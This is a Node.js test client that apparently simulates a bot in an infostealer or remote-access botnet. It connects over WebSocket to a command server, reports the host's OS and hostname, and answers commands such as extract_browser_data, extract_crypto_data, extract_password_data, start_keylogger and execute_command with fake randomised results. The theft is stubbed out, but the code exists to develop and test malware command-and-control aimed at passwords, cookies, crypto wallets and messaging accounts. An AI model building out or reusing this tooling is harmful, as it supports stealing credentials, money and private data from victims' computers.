const WebSocket = require('ws');
const os = require('os');
const crypto = require('crypto');

class BotCommandTester {
    constructor(serverUrl = 'ws://localhost:8080') {
        this.serverUrl = serverUrl;
        this.ws = null;
        this.botId = null;
        this.isConnected = false;
        this.testResults = [];
    }

    connect() {
        return new Promise((resolve, reject) => {
            console.log(`[TESTER] Connecting to ${this.serverUrl}...`);
            
            this.ws = new WebSocket(this.serverUrl);
            
            this.ws.on('open', () => {
                console.log('[TESTER] Connected to server');
                this.isConnected = true;
                this.sendHandshake();
                resolve();
            });
            
            this.ws.on('message', (data) => {
                try {
                    const message = JSON.parse(data);
                    this.handleMessage(message);
                } catch (error) {
                    console.error('[TESTER] Error parsing message:', error);
                }
            });
            
            this.ws.on('close', () => {
                console.log('[TESTER] Disconnected from server');
                this.isConnected = false;
            });
            
            this.ws.on('error', (error) => {
                console.error('[TESTER] WebSocket error:', error);
                reject(error);
            });
        });
    }

    sendHandshake() {
        const systemInfo = {
            os: os.platform(),
            arch: os.arch(),
            hostname: os.hostname(),
            botType: 'TestBot',
            capabilities: ['data_extraction', 'keylogger', 'screenshot', 'file_access', 'crypto_extraction', 'messaging_extraction', 'gaming_extraction', 'password_extraction', 'cloud_extraction']
        };

        this.sendMessage({
            type: 'handshake',
            data: systemInfo
        });
    }

    sendMessage(message) {
        if (this.ws && this.ws.readyState === WebSocket.OPEN) {
            this.ws.send(JSON.stringify(message));
        }
    }

    handleMessage(message) {
        console.log(`[TESTER] Received: ${message.type}`);
        
        if (message.type === 'handshake_response') {
            this.botId = message.botId;
            console.log(`[TESTER] Bot ID assigned: ${this.botId}`);
        } else if (message.type === 'command') {
            console.log(`[TESTER] Received command: ${message.action}`);
            this.handleCommand(message);
        }
    }

    handleCommand(message) {
        const commandId = message.commandId;
        const action = message.action;
        const params = message.params || {};

        console.log(`[TESTER] Executing command: ${action}`);
        
        // Simulate command execution
        let result = 'success';
        let data = {};

        switch (action) {
            case 'extract_browser_data':
                data = {
                    browsers: ['Chrome', 'Firefox', 'Edge'],
                    passwords: Math.floor(Math.random() * 50) + 10,
                    cookies: Math.floor(Math.random() * 200) + 50,
                    bookmarks: Math.floor(Math.random() * 100) + 20
                };
                break;
                
            case 'extract_crypto_data':
                data = {
                    wallets: ['Bitcoin Core', 'Electrum', 'MetaMask'],
                    addresses: Math.floor(Math.random() * 20) + 5,
                    balance: Math.floor(Math.random() * 1000) + 100
                };
                break;
                
            case 'extract_messaging_data':
                data = {
                    platforms: ['Discord', 'Telegram', 'WhatsApp'],
                    messages: Math.floor(Math.random() * 1000) + 100,
                    contacts: Math.floor(Math.random() * 200) + 50
                };
                break;
                
            case 'extract_gaming_data':
                data = {
                    games: ['Steam', 'Epic Games', 'Battle.net'],
                    accounts: Math.floor(Math.random() * 10) + 3,
                    achievements: Math.floor(Math.random() * 500) + 100
                };
                break;
                
            case 'extract_password_data':
                data = {
                    managers: ['LastPass', '1Password', 'Bitwarden'],
                    passwords: Math.floor(Math.random() * 200) + 50,
                    secure_notes: Math.floor(Math.random() * 50) + 10
                };
                break;
                
            case 'extract_cloud_data':
                data = {
                    services: ['Google Drive', 'Dropbox', 'OneDrive'],
                    files: Math.floor(Math.random() * 1000) + 100,
                    storage_used: Math.floor(Math.random() * 50) + 10
                };
                break;
                
            case 'take_screenshot':
                data = {
                    filename: `screenshot_${Date.now()}.png`,
                    size: Math.floor(Math.random() * 500000) + 100000,
                    resolution: '1920x1080'
                };
                break;
                
            case 'start_keylogger':
                data = {
                    status: 'started',
                    log_file: `keylog_${Date.now()}.txt`,
                    buffer_size: 1024
                };
                break;
                
            case 'stop_keylogger':
                data = {
                    status: 'stopped',
                    total_keystrokes: Math.floor(Math.random() * 10000) + 1000,
                    duration: Math.floor(Math.random() * 3600) + 300
                };
                break;
                
            case 'get_system_info':
                data = {
                    os: os.platform(),
                    arch: os.arch(),
                    hostname: os.hostname(),
                    memory: os.totalmem(),
                    cpus: os.cpus().length
                };
                break;
                
            case 'execute_command':
                data = {
                    command: params.command || 'echo test',
                    output: 'Command executed successfully',
                    exit_code: 0
                };
                break;
                
            default:
                result = 'error';
                data = { error: `Unknown command: ${action}` };
        }

        // Record test result
        this.testResults.push({
            command: action,
            result: result,
            data: data,
            timestamp: new Date().toISOString()
        });

        // Send result back
        this.sendMessage({
            type: 'command_result',
            commandId: commandId,
            result: result,
            data: data
        });
    }

    async testAllCommands() {
        const commands = [
            'extract_browser_data',
            'extract_crypto_data', 
            'extract_messaging_data',
            'extract_gaming_data',
            'extract_password_data',
            'extract_cloud_data',
            'take_screenshot',
            'start_keylogger',
            'stop_keylogger',
            'get_system_info',
            'execute_command'
        ];

        console.log('[TESTER] Starting comprehensive command testing...');
        
        for (const command of commands) {
            console.log(`[TESTER] Testing command: ${command}`);
            
            const commandId = Date.now();
            this.sendMessage({
                type: 'command',
                action: command,
                commandId: commandId,
                params: command === 'execute_command' ? { command: 'echo test' } : {}
            });
            
            // Wait a bit between commands
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
        
        // Wait for all commands to complete
        await new Promise(resolve => setTimeout(resolve, 5000));
        
        console.log('[TESTER] Command testing completed!');
        this.printTestResults();
    }

    printTestResults() {
        console.log('\n=== TEST RESULTS ===');
        console.log(`Total commands tested: ${this.testResults.length}`);
        
        const successful = this.testResults.filter(r => r.result === 'success').length;
        const failed = this.testResults.filter(r => r.result === 'error').length;
        
        console.log(`Successful: ${successful}`);
        console.log(`Failed: ${failed}`);
        console.log(`Success rate: ${((successful / this.testResults.length) * 100).toFixed(1)}%`);
        
        console.log('\n=== DETAILED RESULTS ===');
        this.testResults.forEach((result, index) => {
            console.log(`${index + 1}. ${result.command}: ${result.result.toUpperCase()}`);
            if (result.data && Object.keys(result.data).length > 0) {
                console.log(`   Data: ${JSON.stringify(result.data, null, 2)}`);
            }
        });
    }

    disconnect() {
        if (this.ws) {
            this.ws.close();
        }
    }
}

// Run the test
async function runTests() {
    const tester = new BotCommandTester();
    
    try {
        await tester.connect();
        await tester.testAllCommands();
    } catch (error) {
        console.error('[TESTER] Test failed:', error);
    } finally {
        tester.disconnect();
        process.exit(0);
    }
}

// Start testing
runTests();
